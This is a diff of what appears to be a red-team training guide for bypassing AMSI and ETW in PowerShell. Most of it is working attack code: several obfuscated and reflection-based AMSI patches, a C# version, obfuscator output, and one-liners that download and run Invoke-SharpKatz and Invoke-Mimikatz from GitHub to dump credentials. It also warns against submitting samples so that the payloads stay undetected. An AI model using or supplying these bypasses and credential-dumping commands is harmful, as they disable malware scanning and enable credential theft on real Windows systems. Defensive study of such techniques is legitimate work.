@@ -1,4 +1,4 @@
-# Powershell
+# Powershell Lab - Bypassing AMSI and ETW
 
 > ***IMPORTANT*** : Please do not send submit samples to `Virus Total` or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
 > Make sure at all times that sample submussion in Microsoft Defender is turned off, and if for some reason you get prompted to submit a sample, deny the request.
@@ -91,7 +91,7 @@ Now from the same powershell terminal, run SharpKatz from memory with IEX (Invok
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1");Invoke-SharpKatz
 ```
 
-We'll see the script won't execute since AMSI has scanned it and determined it as malicious:
+We'll see the script won't execute since AMSI intercepted it before executing and has sent it to Defender that scanned it and determined it as malicious:
 
 ![image](./images/ps_invokesharkpkatzblocked.jpg)
 
@@ -99,9 +99,9 @@ Let's have a look at the EventViewer logs - open EventViewer, select **"Applicat
 
 ![image](./images/ps_eventvwr.jpg)
 
+OK, so now what?
 
-
-**AMSI Bypass**
+**Bypassing AMSI - How it works**
 
 Let's clear the powershell event logs again:
 
@@ -139,6 +139,8 @@ sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE
 And let's try that Invoke-SharpKatz again, if all goes well, AMSI should be patched and the script will run:
 
 Success!!!
+
+----
 
 However bypassing AMSI doesn't disable eventlogs - which are useful telemetry for EDR's, SIEM's and UEBA's. Let's open Eventviewer again and see what was logged.
 
@@ -266,3 +268,139 @@ $f.SetValue($null,$true);
 <https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c>
 
 includes c-code!!!
+
+AMSIBYPASS
+---
+
+> This bypass does not require administrator rights!!!
+
+Works on 1903, 1909 and before
+
+```yaml
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c, ' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+List `dirty` words: 
+
+```yaml
+[ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
+```
+
+----
+
+Los er door:
+
+```powershell
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)
+```
+
+https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b
+
+
+And finally AMSI.FAIL
+
+or this also works
+
+```powershell
+class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
+$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
+$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
+[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
+```
+
+then run
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+```
+
+
+**C# Example:**
+
+```csharp
+using System;
+using System.Reflection;
+
+public class AmsiBypass
+{
+    public static void Main(string[] args)
+    {
+        try
+        {
+            // Get the AmsiUtils type
+            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);
+
+            // Get the amsiInitFailed field
+            FieldInfo amsiInitFailedField = amsiUtilsType.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+
+            // Set the amsiInitFailed field to true
+            if (amsiInitFailedField != null)
+            {
+                amsiInitFailedField.SetValue(null, true);
+                Console.WriteLine("AMSI bypassed.");
+            }
+            else
+            {
+                Console.WriteLine("amsiInitFailed field not found.");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error: {ex.Message}");
+        }
+    }
+}
+```
+## Key Considerations:
+
+* **Assembly Loading:**
+    * If your .NET binary doesn't already have `System.Management.Automation.dll` loaded, you may need to load it explicitly using `Assembly.Load()` or related methods.
+* **.NET Version Compatibility:**
+    * Ensure that the reflection code is compatible with the .NET Framework or .NET Core/.NET 5+ version that the target binary is using.
+* **Security Implications:**
+    * AMSI bypass techniques can be used for malicious purposes. Use them responsibly and ethically.
+* **EDR Detection:**
+    *
+* **Finding the correct assembly:**
+    * In some .net applications, the `System.Management.Automation.dll` may not be loaded. If this is the case, you will need to load it.
+
+**In summary:** The AMSI bypass technique using reflection is not limited to PowerShell and can be successfully implemented in .NET binaries.
+
+-----
+# dotnet packing
+
+ConfuserEx
+Babel
+
+----
+https://github.com/pracsec/AmsiScanner/tree/main/src
+
+https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr
+
+```powershell
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
+```
+
+Use this one:
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+>Invoke-obfuscation
+>set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+>token
+>string
+>2
+
+output =
+```powershell
+[Ref].Assembly.GetType(("{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}"-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField(("{0}{1}{2}" -f 'amsi','InitFa','iled'),("{1}{0}{4}{2}{3}" -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
+```
